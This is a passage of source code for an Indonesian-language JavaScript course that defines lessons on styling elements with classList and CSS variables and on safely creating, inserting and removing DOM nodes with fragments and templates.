        "Bandingkan kedua blok itu sebagai satu kesatuan, karena di situlah pembagian tugasnya terlihat. Blok CSS memutuskan **segalanya tentang tampilan**, mulai dari bahwa nilainya dipakai sebagai lebar, warnanya apa, sampai bahwa perubahannya dianimasikan selama 300 milidetik. Blok JavaScript hanya mengoper satu angka lewat `setProperty('--progres', ...)` dan tidak tahu apa-apa tentang bagaimana angka itu dipakai. Keuntungannya nyata, karena mengubah bar menjadi vertikal, mengganti animasinya, atau membuatnya berbeda di mode gelap semuanya bisa dilakukan **tanpa menyentuh satu baris JavaScript pun**. Perhatikan juga `var(--progres, 0%)` punya argumen kedua, yaitu nilai cadangan yang dipakai sebelum JavaScript sempat menyetel apa pun, sehingga bar tidak tampil rusak saat halaman baru dimuat.",
      ),
      callout(
        'info',
        'Ini pola yang dipakai website ini sendiri',
        'Tema terang/gelap di sini bekerja persis begitu: JavaScript hanya menambah atau menghapus class `dark` pada `<html>`, dan seluruh palet berpindah karena CSS variable-nya berubah. Tidak ada satu pun warna yang ditulis dari JavaScript.',
      ),

      h2('Membaca style yang benar-benar berlaku'),
      code(
        'js',
        `
        el.style.color;                          // '' — hanya membaca style INLINE
        getComputedStyle(el).color;              // 'rgb(25, 23, 19)' — hasil akhir

        // getComputedStyle memaksa perhitungan layout. Jangan panggil di dalam loop.
        `,
      ),
      p(
        'Ini perbedaan yang membuat banyak orang mengira kodenya tidak bekerja. `el.style` **hanya melihat style inline**, yaitu atribut `style="..."` pada elemen itu sendiri, atau nilai yang kamu tulis sendiri lewat JavaScript. Warna yang berasal dari berkas CSS tidak pernah muncul di sana, sehingga `el.style.color` menghasilkan string kosong meski teksnya jelas-jelas berwarna di layar. `getComputedStyle` memberi **hasil akhir** setelah browser menggabungkan semua sumber, mulai dari berkas CSS, style inline, pewarisan, sampai media query. Perhatikan bentuk nilainya ikut dinormalkan, karena warna yang kamu tulis sebagai `#191713` akan dibaca kembali sebagai `rgb(25, 23, 19)`, jadi membandingkannya dengan string aslinya tidak akan cocok. Peringatan di komentar sama dengan `innerText` sebelumnya, yaitu bahwa memberi hasil akhir berarti browser harus menghitung tata letak lebih dulu.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Tombol Simpan pada formulir profil punya empat keadaan, yaitu normal, sedang menyimpan, berhasil, dan gagal. Kamu mengaturnya dengan mengubah gaya langsung lewat `style`, dan kodenya cepat menjadi dua puluh baris penugasan warna. Ketika desainer mengubah warna merek, kamu harus menyisir seluruh berkas JavaScript. Lalu tema gelap ditambahkan, dan seluruhnya harus ditulis dua kali.',
      ),
      p(
        'Yang keliru bukan cara menulisnya melainkan pembagian tugasnya. Warna, ukuran, dan bentuk adalah urusan CSS. Tugas JavaScript cukup menyatakan **keadaan apa yang sedang berlaku**, dan CSS yang memutuskan seperti apa keadaan itu terlihat.',
      ),
      code(
        'css',
        `
        /* Seluruh keputusan visual ada di sini, satu tempat. */
        .tombol-simpan { background: var(--warna-merek); color: white; }
        .tombol-simpan[data-keadaan='menyimpan'] { opacity: 0.6; cursor: progress; }
        .tombol-simpan[data-keadaan='berhasil'] { background: var(--warna-sukses); }
        .tombol-simpan[data-keadaan='gagal'] { background: var(--warna-bahaya); }

        @media (prefers-reduced-motion: no-preference) {
          .tombol-simpan { transition: background 200ms ease; }
        }
        `,
        { filename: 'src/gaya/tombol.css' },
      ),
      code(
        'js',
        `
        // JavaScript hanya menyatakan keadaan. Satu baris per perubahan.
        function setKeadaan(tombol, keadaan) {
          tombol.dataset.keadaan = keadaan;
          tombol.disabled = keadaan === 'menyimpan';
          tombol.setAttribute('aria-busy', String(keadaan === 'menyimpan'));
        }

        async function simpan(tombol, data) {
          setKeadaan(tombol, 'menyimpan');
          try {
            await kirim(data);
            setKeadaan(tombol, 'berhasil');
          } catch (galat) {
            setKeadaan(tombol, 'gagal');
            throw galat;
          }
        }
        `,
        { filename: 'src/tombol-simpan.js' },
      ),
      p(
        'Fungsi `setKeadaan` menggantikan dua puluh baris penugasan gaya dengan tiga baris. Yang berubah bukan hanya jumlah barisnya melainkan siapa yang berwenang. Desainer bisa mengubah seluruh tampilan keempat keadaan tanpa menyentuh JavaScript, dan menambah tema gelap cukup dengan menambah blok CSS. Kalau warnanya ditulis di JavaScript, keduanya mustahil.',
      ),
      p(
        'Baris `aria-busy` sama pentingnya dengan warnanya, dan ia sering dilupakan. Pengguna pembaca layar tidak melihat perubahan warna, jadi tanpa atribut itu ia tidak punya cara tahu tombolnya sedang bekerja. Ini bagian dari aturan baseline aksesibilitas project ini, yaitu jangan pernah menyampaikan keadaan hanya lewat warna.',
      ),
      code(
        'js',
        `
        // classList: empat method yang menutup hampir semua kebutuhan.
        el.classList.add('aktif', 'terpilih');       // boleh beberapa sekaligus
        el.classList.remove('tersembunyi');
        el.classList.toggle('terbuka');              // balik keadaannya
        el.classList.toggle('gelap', temaGelap);     // paksa sesuai nilai boolean
        el.classList.contains('aktif');              // true atau false

        // classList.replace untuk mengganti satu kelas dengan yang lain
        el.classList.replace('ukuran-kecil', 'ukuran-besar');
        `,
        { caption: 'Bentuk dua argumen pada `toggle` menghilangkan kebutuhan `if`.' },
      ),
      p(
        "Bentuk `toggle('gelap', temaGelap)` dengan argumen kedua adalah yang paling sering berguna dan paling jarang diketahui. Ia menambahkan kelas kalau argumen keduanya bernilai benar dan menghapusnya kalau salah, sehingga menggantikan blok `if` empat baris. Perhatikan bedanya dengan bentuk satu argumen yang selalu membalik, dan memakai bentuk satu argumen untuk menyinkronkan keadaan adalah sumber bug saat fungsinya terpanggil dua kali.",
      ),
      callout(
        'warning',
        'Membaca gaya yang sedang berlaku tidak sama dengan membaca `el.style`',
        '`el.style.width` hanya berisi gaya yang ditulis langsung pada atribut `style` elemen itu, dan hampir selalu kosong untuk gaya yang datang dari berkas CSS. Untuk membaca nilai yang benar-benar berlaku, pakai `getComputedStyle(el).width`. Perlu diingat pemanggilan itu memaksa peramban menghitung tata letak, jadi jangan dipakai di dalam loop, seperti dibahas di Sub-bab 4.11.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Dua pesan pertama diverifikasi di Chromium sungguhan, dan dua sisanya adalah kegagalan senyap yang lebih sering ditemui.',
      ),
      code(
        'text',
        `
        el.classList.add('a b');
                     ^

        InvalidCharacterError: Failed to execute 'add' on 'DOMTokenList':
        The token provided ('a b') contains HTML space characters,
        which are not valid in tokens.
        `,
        { caption: 'Beberapa kelas diberikan sebagai satu teks berspasi.' },
      ),
      p(
        "Nama kelas tidak boleh mengandung spasi, sebab spasi adalah pemisah antar-kelas. Yang kamu maksud hampir pasti dua kelas, dan bentuk yang benar adalah `classList.add('a', 'b')` dengan dua argumen terpisah. Kalau daftar kelasnya datang dari variabel berupa teks, sebarkan dulu dengan `classList.add(...teks.split(' '))`.",
      ),
      code(
        'text',
        `
        document.querySelectorAll('.baris').classList.add('x');
                                            ^

        TypeError: Cannot read properties of undefined (reading 'add')
        `,
        { caption: '`classList` dipanggil pada daftar elemen.' },
      ),
      p(
        "Sudah muncul di Sub-bab 4.2 dan diulang di sini karena bentuk inilah yang paling sering memunculkannya. Daftar tidak punya `classList`, jadi hasilnya `undefined`. Telusuri daftarnya, misalnya `document.querySelectorAll('.baris').forEach((el) => el.classList.add('x'))`.",
      ),
      code(
        'text',
        `
        el.style.width = 100;
        console.log(JSON.stringify(el.style.width));

        ""
        `,
        { caption: 'Angka tanpa satuan diabaikan tanpa satu pun peringatan.' },
      ),
      p(
        'Sudah dibahas di Sub-bab 4.4 dan diulang karena inilah tempatnya paling sering terjadi. Yang perlu ditambahkan, kesalahan ini sangat sering muncul saat nilainya berasal dari perhitungan, misalnya `el.style.top = posisi + jarak` yang menghasilkan angka. Bungkus dengan template literal menjadi `` `${posisi + jarak}px` `` supaya satuannya tidak pernah lupa.',
      ),
      code(
        'text',
        `
        el.setAttribute('class', 'aktif');

        // Seluruh kelas lain hilang: kartu, kartu-produk, terpilih.
        `,
        { caption: 'Tidak ada error, dan seluruh kelas sebelumnya terhapus.' },
      ),
      p(
        "`setAttribute('class', ...)` menimpa seluruh isi atribut kelas, termasuk kelas yang dipasang bagian lain aplikasi atau oleh kerangka kerja. Gejalanya berupa tampilan yang tiba-tiba kehilangan seluruh gayanya, dan penyebabnya biasanya sulit ditemukan karena baris yang menimpanya bisa jauh dari tempat gejalanya terlihat. Pakai `classList` yang hanya menyentuh kelas yang kamu sebut.",
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`InvalidCharacterError` pada `classList.add`',
            'Nama kelas mengandung spasi',
            'Berikan sebagai beberapa argumen, atau sebarkan hasil `split`',
          ],
          [
            "`Cannot read properties of undefined (reading 'add')`",
            '`classList` dipanggil pada daftar elemen',
            'Telusuri daftarnya lebih dulu',
          ],
          [
            'Gaya tidak berubah tanpa error',
            'Nilai diberikan tanpa satuan',
            'Sertakan satuannya lewat template literal',
          ],
          [
            'Seluruh gaya elemen hilang',
            "`setAttribute('class', ...)` menimpa semuanya",
            'Pakai `classList.add` dan `classList.remove`',
          ],
          [
            '`el.style.warna` selalu kosong padahal CSS-nya jelas ada',
            '`el.style` hanya membaca gaya inline',
            'Pakai `getComputedStyle(el)`, dan hindari memanggilnya di dalam loop',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Mengatur tampilan dari JavaScript mudah dilakukan dan mudah dilakukan berlebihan. Sebagian besar baris di bawah adalah tentang mengembalikan keputusan visual ke tempatnya.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menulis warna dan ukuran langsung lewat `el.style`',
            'Langsung terlihat hasilnya tanpa berpindah berkas',
            'Nilai visual tersebar ke seluruh JavaScript, tema gelap jadi mustahil, dan gaya inline mengalahkan seluruh aturan CSS sehingga sulit ditimpa',
          ],
          [
            "Menyembunyikan elemen dengan `el.style.display = 'none'`",
            'Cara paling langsung',
            'Mengembalikannya butuh mengingat nilai `display` aslinya, apakah `block`, `flex`, atau `grid`. Pakai kelas, atau atribut `hidden`',
          ],
          [
            'Memakai `classList.toggle` satu argumen untuk menyinkronkan keadaan',
            'Ia memang menyalakan dan mematikan',
            'Kalau fungsinya terpanggil dua kali untuk keadaan yang sama, hasilnya terbalik. Pakai bentuk dua argumen yang memaksa sesuai nilainya',
          ],
          [
            'Membaca `getComputedStyle` di dalam loop untuk tiap elemen',
            'Perlu tahu ukuran tiap elemen',
            'Tiap pemanggilan memaksa perhitungan tata letak. Untuk seribu elemen ini penyebab pembekuan, seperti diukur di Sub-bab 4.11',
          ],
          [
            'Menyampaikan keadaan hanya lewat warna',
            'Warnanya jelas berbeda',
            'Pengguna yang kesulitan membedakan warna dan pengguna pembaca layar tidak mendapat informasinya. Sertakan teks, ikon, atau atribut ARIA',
          ],
          [
            'Menambahkan transisi ke semua hal tanpa syarat',
            'Terlihat lebih halus',
            'Sebagian pengguna menyetel sistemnya untuk mengurangi gerakan karena alasan kesehatan. Bungkus dengan `@media (prefers-reduced-motion: no-preference)`',
          ],
        ],
      ),
      p(
        'Baris kedua punya jalan keluar yang lebih baik daripada yang biasa dipakai. Atribut `hidden` adalah cara standar HTML untuk menyembunyikan elemen, dan dari JavaScript ia disetel dengan `el.hidden = true`. Keunggulannya, mengembalikannya cukup `el.hidden = false` tanpa perlu mengingat nilai `display` aslinya, dan pembaca layar juga mengabaikan elemen tersembunyi itu dengan benar.',
      ),
      callout(
        'tip',
        'Pembagian tugas yang membuat kode UI tetap terkelola',
        'CSS memutuskan **seperti apa** sebuah keadaan terlihat. JavaScript memutuskan **keadaan mana** yang sedang berlaku. Kalau kamu menemukan nilai warna atau ukuran di dalam berkas JavaScript, hampir selalu ada satu kelas atau satu atribut data yang seharusnya menggantikannya.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        '`classList.toggle(nama, kondisi)` menggantikan if/else tampilan.',
        'JavaScript mengubah keadaan; CSS memutuskan tampilan.',
        '`style` langsung hanya untuk nilai yang dihitung saat berjalan.',
        'CSS custom property adalah jembatan terbaik antara keduanya.',
        '`getComputedStyle` membaca hasil akhir, tapi memicu perhitungan layout.',
      ),
      references(
        {
          label: 'Element.classList',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Element/classList',
          source: 'MDN',
          note: 'Seluruh method `add`/`remove`/`toggle`/`replace`, termasuk bentuk `toggle(nama, kondisi)`.',
        },
        {
          label: 'Using CSS custom properties',
          href: 'https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_cascading_variables/Using_CSS_custom_properties',
          source: 'MDN',
          note: 'Jembatan antara JavaScript dan CSS yang dipakai untuk tema di website ini.',
        },
        {
          label: 'CSSStyleDeclaration.setProperty()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleDeclaration/setProperty',
          source: 'MDN',
          note: 'Satu-satunya cara menulis nama property berawalan `--` dari JavaScript.',
        },
        {
          label: 'Window.getComputedStyle()',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle',
          source: 'MDN',
          note: 'Membaca nilai yang benar-benar berlaku — beserta peringatan biayanya.',
        },
        {
          label: 'Avoid large, complex layouts and layout thrashing',
          href: 'https://web.dev/articles/avoid-large-complex-layouts-and-layout-thrashing',
          source: 'web.dev',
          note: 'Alasan `getComputedStyle` di dalam loop berbahaya — dibahas tuntas di Sub-bab 4.12.',
        },
      ),
    ],
  ),

  written(
    'membuat-menghapus-node',
    'Membuat, Menyisipkan & Menghapus Node',
    23,
    'Membangun elemen dari kode dengan aman dan efisien.',
    [
      terms(
        {
          term: 'createElement',
          meaning:
            'Method untuk **membuat elemen baru dari kode**, misalnya `document.createElement("li")`. Yang penting dipahami: elemen itu belum ada di halaman — ia mengambang di memori sampai kamu benar-benar menyisipkannya ke dalam pohon DOM. Inilah jalur aman membangun tampilan, karena isinya diisi lewat `textContent`, bukan dengan merangkai HTML.',
        },
        {
          term: 'append / appendChild',
          meaning:
            'Menyisipkan node sebagai **anak terakhir**. `append()` lebih baru dan lebih longgar — ia menerima beberapa node sekaligus dan bahkan teks biasa. `appendChild()` versi lama, hanya menerima satu node. Untuk kode baru, pakai `append()`.',
        },
        {
          term: 'prepend',
          meaning:
            'Menyisipkan sebagai **anak pertama**, kebalikan dari `append`. Berguna untuk daftar yang item terbarunya harus muncul di atas.',
        },
        {
          term: 'before / after',
          meaning:
            'Menyisipkan node sebagai **saudara** — tepat sebelum atau sesudah elemen acuan, bukan di dalamnya. Pembedaan "di dalam" versus "di samping" inilah yang membedakan keempat method penyisipan ini.',
        },
        {
          term: 'remove',
          meaning:
            'Menghapus elemen dari pohon DOM. Perlu diketahui: elemennya **tidak langsung hilang dari memori** kalau masih ada variabel yang menunjuknya. Karena itu kamu masih bisa menyisipkannya kembali nanti — sifat yang berguna, tapi juga sumber kebocoran memori kalau tidak disengaja.',
        },
        {
          term: 'DocumentFragment',
          meaning:
            'Terjemahan bebasnya **potongan dokumen**. Wadah sementara di luar pohon DOM untuk menampung banyak elemen sebelum disisipkan. Manfaatnya besar: menyisipkan seratus elemen satu per satu memicu perhitungan ulang berkali-kali, sementara menyisipkan satu fragment berisi seratus elemen hanya sekali.',
        },
        {
          term: 'cloneNode',
          meaning:
            'Menggandakan sebuah node. Argumennya menentukan kedalaman: `cloneNode(true)` menyalin beserta seluruh isinya, `cloneNode(false)` hanya elemen terluarnya. Satu hal yang **tidak ikut tersalin**: event listener yang dipasang dengan `addEventListener`.',
        },
        {
          term: 'template',
          meaning:
            'Tag `<template>` yang isinya **diurai tapi tidak digambar** ke layar. Dipakai sebagai cetakan yang digandakan berkali-kali. Ini cara paling rapi membuat daftar berulang tanpa merangkai HTML dari teks sama sekali.',
        },
        {
          term: 'batching',
          meaning:
            'Terjemahannya **menggabungkan menjadi satu rombongan**. Mengumpulkan banyak perubahan lalu menerapkannya sekaligus, alih-alih satu per satu. Prinsip ini yang mendasari `DocumentFragment`, dan ia kembali muncul di Sub-bab 4.12 sebagai kunci performa DOM.',
        },
      ),

      h2('Membuat'),
      code(
        'js',
        `
        const li = document.createElement('li');
        li.textContent = judul;             // aman untuk data pengguna
        li.className = 'item';
        li.dataset.id = id;

        const teks = document.createTextNode('halo');
        `,
      ),
      p(
        'Elemen yang baru dibuat `createElement` **belum ada di halaman**, karena ia mengambang di memori sampai kamu menyisipkannya. Itu justru menguntungkan, sebab kamu bisa mengaturnya sepuasnya tanpa satu pun perubahan yang terlihat berkedip di layar. Perhatikan `li.textContent = judul` beserta komentarnya. Karena judul bisa berasal dari ketikan pengguna, memakai `textContent` di sini bukan sekadar kebiasaan melainkan penerapan langsung aturan XSS dari sub-bab sebelumnya. Perhatikan juga seluruh penyusunan ini memakai **property**, bukan merangkai string HTML, dan itulah cara membuat elemen yang aman apa pun isi datanya. `createTextNode` jarang dibutuhkan langsung, karena menugaskan `textContent` sudah membuatnya untukmu. Ia berguna hanya saat kamu perlu menyelipkan potongan teks di antara dua elemen.',
      ),

      h2('Menyisipkan'),
      code(
        'js',
        `
        wadah.append(li);          // di akhir — bisa beberapa sekaligus, boleh string
        wadah.prepend(li);         // di awal
        acuan.before(li);          // sebelum elemen acuan
        acuan.after(li);           // sesudah
        acuan.replaceWith(li);     // menggantikan

        wadah.append(a, b, 'teks biasa');   // campur elemen dan string
        `,
      ),
      p(
        'Perhatikan pembagian yang rapi di sini. Dua baris pertama dipanggil pada **wadahnya** dan menyisipkan ke dalam, sedangkan tiga baris berikutnya dipanggil pada **elemen acuan** dan menyisipkan relatif terhadapnya. Membaca kodenya jadi seperti membaca kalimat, karena `acuan.before(li)` berarti "taruh `li` sebelum acuan". Baris terakhir menunjukkan dua kemudahan yang tidak dimiliki API lama, yaitu beberapa argumen sekaligus dalam satu pemanggilan, dan **string yang otomatis diperlakukan sebagai teks**. Kemudahan kedua itu penting untuk keamanan. `wadah.append(\'<b>x</b>\')` menampilkan tanda kurung siku apa adanya sebagai teks dan tidak pernah sebagai tag, jadi berbeda dari `innerHTML`, jalur ini aman untuk data pengguna.',
      ),
      callout(
        'info',
        'API lama yang masih sering kamu temui',
        '`appendChild`, `insertBefore`, `removeChild` masih bekerja dan ada di banyak kode. API modern (`append`, `before`, `remove`) lebih pendek, menerima beberapa argumen, dan menerima string — pakai yang modern untuk kode baru.',
      ),

      h2('Menghapus dan memindahkan'),
      code(
        'js',
        `
        el.remove();                 // hapus dirinya sendiri
        wadah.replaceChildren();     // kosongkan seluruh isi

        // Menyisipkan elemen yang SUDAH ada di DOM akan MEMINDAHKANNYA,
        // bukan menyalin. Ini fitur, dan sering mengejutkan.
        wadahLain.append(elemenYangSudahAda);   // pindah, bukan duplikat

        const salinan = el.cloneNode(true);     // true = ikut seluruh isinya
        `,
      ),
      p(
        "Bagian tengah adalah yang paling sering mengejutkan, karena sebuah node hanya bisa berada di **satu tempat** dalam pohon DOM. Jadi menyisipkan elemen yang sudah tampil di halaman tidak menggandakannya, melainkan mencabutnya dari tempat lama dan memindahkannya. Sifat itu sebenarnya sangat berguna untuk mengurutkan ulang daftar tanpa membuat elemen baru, karena elemen yang dipindahkan **membawa serta semua listener dan keadaannya**. Kalau yang kamu mau memang salinan, `cloneNode` jawabannya, dan argumennya menentukan kedalaman. `true` menyalin beserta seluruh isinya, sedangkan `false` hanya kulit terluarnya. Satu hal penting yang **tidak** ikut tersalin adalah event listener yang dipasang dengan `addEventListener`, jadi salinan hasil `cloneNode` selalu perlu dipasangi listener sendiri, atau ditangani lewat delegation di sub-bab berikutnya. Baris `replaceChildren()` tanpa argumen adalah cara terpendek mengosongkan wadah, dan lebih baik daripada `innerHTML = ''` karena tidak melibatkan pengurai HTML sama sekali.",
      ),

      h2('Kenapa menyisipkan di dalam loop itu mahal'),
      code(
        'js',
        `
        // LAMBAT: setiap append menyentuh DOM yang sedang tampil
        for (const item of seribuItem) {
          wadah.append(buatBaris(item));
        }
        `,
      ),
      code(
        'js',
        `
        // CEPAT: rakit di luar DOM dulu, sisipkan sekali
        const fragment = document.createDocumentFragment();
        for (const item of seribuItem) {
          fragment.append(buatBaris(item));
        }
        wadah.append(fragment);       // satu kali sentuhan ke DOM

        // Alternatif yang sama cepatnya dan lebih pendek:
        wadah.append(...seribuItem.map(buatBaris));
        `,
      ),
      p(
        'Kedua versi membuat seribu baris yang sama, jadi perbedaannya bukan pada pekerjaan membuat elemen melainkan pada **berapa kali DOM yang sedang tampil disentuh**. Versi lambat menyentuhnya seribu kali, dan tiap sentuhan berpotensi memaksa browser menghitung ulang tata letak halaman. Versi cepat merakit seluruh baris di dalam `DocumentFragment`, yaitu sebuah wadah yang **tidak berada di dalam dokumen** sehingga menambahkan apa pun ke dalamnya tidak memicu perhitungan apa-apa, lalu menyisipkannya sekali. Baris terakhir menunjukkan bahwa fragment tidak selalu perlu ditulis eksplisit. `append` menerima banyak argumen, jadi spread dari hasil `map` mencapai efek yang sama dengan satu baris. Pilih yang mana pun, karena yang penting prinsipnya, yaitu **rakit dulu di luar, sisipkan sekali**.',
      ),
      callout(
        'tip',
        'Kenapa `DocumentFragment` cepat',
        'Ia adalah wadah yang tidak berada di dalam dokumen, jadi menambahkan sesuatu ke dalamnya tidak memicu perhitungan layout. Saat disisipkan, isinya dipindahkan dan fragment-nya sendiri menghilang — tidak ada elemen pembungkus tambahan.',
      ),

      h2('Pola merender daftar dengan aman'),
      code(
        'js',
        `
        function renderDaftar(wadah, items) {
          wadah.replaceChildren();                    // kosongkan

          if (items.length === 0) {
            const kosong = document.createElement('p');
            kosong.className = 'kosong';
            kosong.textContent = 'Belum ada tugas. Tambahkan yang pertama.';
            wadah.append(kosong);
            return;                                   // empty state ditangani
          }

          const fragment = document.createDocumentFragment();

          for (const item of items) {
            const li = document.createElement('li');
            li.dataset.id = item.id;

            const label = document.createElement('span');
            label.textContent = item.judul;          // AMAN — bukan innerHTML

            const hapus = document.createElement('button');
            hapus.type = 'button';
            hapus.dataset.aksi = 'hapus';
            hapus.textContent = 'Hapus';

            li.append(label, hapus);
            fragment.append(li);
          }

          wadah.append(fragment);
        }
        `,
      ),
      p(
        'Perhatikan bagaimana fungsi ini merangkum semua yang baru dipelajari sekaligus. `replaceChildren()` mengosongkan wadah tanpa `innerHTML = ""`, empty state ditangani secara eksplisit alih-alih membiarkan wadah kosong tanpa penjelasan apa pun, `textContent` dipakai untuk `item.judul` karena datanya bisa saja berasal dari pengguna, dan seluruh baris dirakit dulu ke dalam `fragment` sebelum satu kali `wadah.append(fragment)` di akhir, bukan `append` satu per satu di dalam loop. Pola inilah yang React lakukan secara otomatis di balik layar, dan di sini kamu menulisnya sendiri supaya tahu persis apa yang nanti sedang diautomasi.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman hasil pencarian menampilkan dua puluh kartu produk, dan tombol Muat Lagi menambah dua puluh lagi. Setiap kartu berisi gambar, judul, harga, dan tombol keranjang. Kamu membangunnya dengan menggabungkan teks HTML lalu memasangnya lewat `innerHTML`, dan tiga masalah muncul berurutan, yaitu kotak pencarian kehilangan fokus tiap kali dimuat, gambar berkedip, dan judul produk yang mengandung tanda kurung sudut merusak tata letak.',
      ),
      p(
        'Ketiganya selesai dengan satu perubahan pendekatan, yaitu membangun elemen sungguhan alih-alih menyusun teks. Yang paling menolong adalah `template`, yaitu elemen HTML yang isinya tidak dirender tapi bisa disalin berkali-kali.',
      ),
      code(
        'html',
        `
        <!-- Isi template tidak ditampilkan, dan gambarnya tidak diunduh. -->
        <template id="tpl-kartu">
          <article class="kartu" data-produk-id>
            <img alt="" loading="lazy" width="240" height="240" />
            <h3 class="judul"></h3>
            <p class="harga"></p>
            <button type="button" data-aksi="keranjang">Tambah ke keranjang</button>
          </article>
        </template>
        `,
        { filename: 'index.html' },
      ),
      code(
        'js',
        `
        const tpl = document.getElementById('tpl-kartu');

        function buatKartu(produk) {
          // Salin isi template. true berarti termasuk seluruh anaknya.
          const kartu = tpl.content.firstElementChild.cloneNode(true);

          kartu.dataset.produkId = produk.id;

          const gambar = kartu.querySelector('img');
          gambar.src = produk.gambar;
          gambar.alt = produk.nama;              // dari data, tapi masuk sebagai atribut aman

          kartu.querySelector('.judul').textContent = produk.nama;
          kartu.querySelector('.harga').textContent = formatRupiah(produk.hargaSen);

          return kartu;
        }

        function tambahKartu(daftar) {
          const frag = document.createDocumentFragment();
          for (const produk of daftar) frag.append(buatKartu(produk));

          // Satu operasi DOM untuk dua puluh kartu.
          document.getElementById('hasil').append(frag);
        }
        `,
        { filename: 'src/hasil-pencarian.js' },
      ),
      p(
        'Struktur kartunya ditulis sekali di HTML, tempat ia paling enak dibaca dan bisa diperiksa validitasnya. JavaScript hanya menyalin lalu mengisi bagian yang berubah. Judul produk masuk lewat `textContent`, sehingga tanda kurung sudut di dalamnya tampil sebagai teks biasa dan tidak merusak apa pun. Ini penyelesaian masalah ketiga tanpa satu baris penyaring pun.',
      ),
      p(
        'Masalah pertama, yaitu fokus yang hilang, selesai karena kartu **baru** ditambahkan tanpa menyentuh yang lama. Kotak pencarian dan seluruh kartu sebelumnya adalah elemen yang sama persis seperti sebelumnya, jadi fokus, posisi gulir, dan penangan peristiwa semuanya bertahan. Bandingkan dengan `innerHTML +=` yang membangun ulang seluruh isi wadah.',
      ),
      p(
        '`DocumentFragment` adalah wadah sementara yang tidak pernah masuk ke halaman. Kedua puluh kartu dirakit di dalamnya, lalu satu panggilan `append` memindahkan seluruh isinya sekaligus. Perlu dicatat jujur, pada peramban modern keuntungan kecepatannya kecil, sebab peramban sudah menunda perhitungan tata letak sampai akhir tugas. Pengukuran di Sub-bab 4.11 menunjukkan dua ribu penambahan satu per satu hanya butuh sekitar satu milidetik. Yang benar-benar mahal bukan menambah node, melainkan **membaca** tata letak di antara penambahan.',
      ),
      code(
        'js',
        `
        // Menghapus dengan aman, dan mengosongkan wadah.
        kartu.remove();                       // hapus dirinya sendiri, tanpa perlu induk

        wadah.replaceChildren();              // kosongkan, lebih jelas dari innerHTML = ''
        wadah.replaceChildren(...kartuBaru);  // ganti seluruh isi sekaligus

        // Memindahkan node, bukan menyalinnya.
        wadahLain.append(kartu);              // kartu PINDAH, hilang dari tempat lamanya
        wadahLain.append(kartu.cloneNode(true)); // ini baru menyalin
        `,
        { caption: 'Empat operasi yang menutup hampir seluruh kebutuhan sehari-hari.' },
      ),
      p(
        'Baris terakhir memuat perilaku yang sering mengejutkan, yaitu sebuah node hanya bisa berada di satu tempat. Memberikan node yang sudah ada di halaman ke `append` akan **memindahkannya**, bukan menyalinnya. Kadang itu persis yang kamu inginkan, misalnya memindahkan baris antar-kolom papan tugas. Kadang itu bug, misalnya saat kamu bermaksud menampilkan elemen yang sama di dua tempat.',
      ),
      callout(
        'tip',
        '`remove` dan `replaceChildren` menggantikan pola lama yang lebih panjang',
        'Sebelum keduanya ada, orang menulis `el.parentNode.removeChild(el)` dan loop `while (el.firstChild) el.removeChild(el.firstChild)`. Keduanya masih bekerja dan masih banyak ditemui di kode lama, tapi untuk kode baru `remove` dan `replaceChildren` lebih pendek dan lebih sulit disalahtulis.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Dua pesan pertama diverifikasi di Chromium sungguhan, dan keduanya adalah aturan struktur pohon yang dijaga peramban.',
      ),
      code(
        'text',
        `
        document.body.removeChild(document.querySelector('.baris'));
                      ^

        NotFoundError: Failed to execute 'removeChild' on 'Node':
        The node to be removed is not a child of this node.
        `,
        { caption: 'Node yang dihapus bukan anak langsung dari induk yang disebut.' },
      ),
      p(
        '`removeChild` menuntut hubungan induk dan anak **langsung**, bukan sekadar berada di dalamnya. Elemen `.baris` berada di dalam `#wadah` yang berada di dalam `body`, sehingga ia cucu bukan anak. Inilah alasan `el.remove()` jauh lebih enak dipakai, sebab ia tidak perlu tahu siapa induknya dan tidak bisa salah menebaknya.',
      ),
      code(
        'text',
        `
        document.querySelector('.baris').appendChild(document.getElementById('wadah'));
                                         ^

        HierarchyRequestError: Failed to execute 'appendChild' on 'Node':
        The new child element contains the parent.
        `,
        { caption: 'Sebuah induk dicoba dimasukkan ke dalam anaknya sendiri.' },
      ),
      p(
        'Pohon DOM tidak boleh melingkar, jadi peramban menolak operasi yang akan membuat sebuah node menjadi keturunan dari dirinya sendiri. Kesalahan ini biasanya muncul saat memindahkan elemen dengan pemilih yang salah, misalnya bermaksud memindahkan kartu ke wadah lain tapi keliru mengambil wadah asalnya. Pesannya cukup jelas, dan yang perlu diperiksa adalah kedua sisi pemanggilannya.',
      ),
      code(
        'text',
        `
        const kartu = document.querySelector('.kartu');
        kolomKiri.append(kartu);
        kolomKanan.append(kartu);

        // Kartu hanya ada di kolom kanan. Tidak ada error.
        `,
        { caption: 'Node yang sama ditambahkan ke dua tempat.' },
      ),
      p(
        'Karena satu node hanya bisa berada di satu tempat, penambahan kedua memindahkannya dan penambahan pertama seolah tidak pernah terjadi. Tidak ada error karena tidak ada aturan yang dilanggar. Kalau kamu memang ingin dua salinan, gunakan `cloneNode(true)` untuk yang kedua, dan ingat salinannya tidak membawa penangan peristiwa yang dipasang lewat `addEventListener`.',
      ),
      code(
        'text',
        `
        const tpl = document.getElementById('tpl-kartu');
        const kartu = tpl.querySelector('.kartu');
        console.log(kartu);

        null
        `,
        { caption: 'Isi `template` tidak berada di pohon dokumen biasa.' },
      ),
      p(
        "Isi elemen `template` disimpan di pohon terpisah yang bisa diakses lewat properti `content`, dan pencarian biasa dari elemen templatenya tidak menemukan apa-apa. Bentuk yang benar adalah `tpl.content.querySelector('.kartu')`. Pemisahan ini justru berguna, sebab ia yang membuat gambar di dalam template tidak ikut diunduh dan skrip di dalamnya tidak dijalankan sampai disalin.",
      ),
      table(
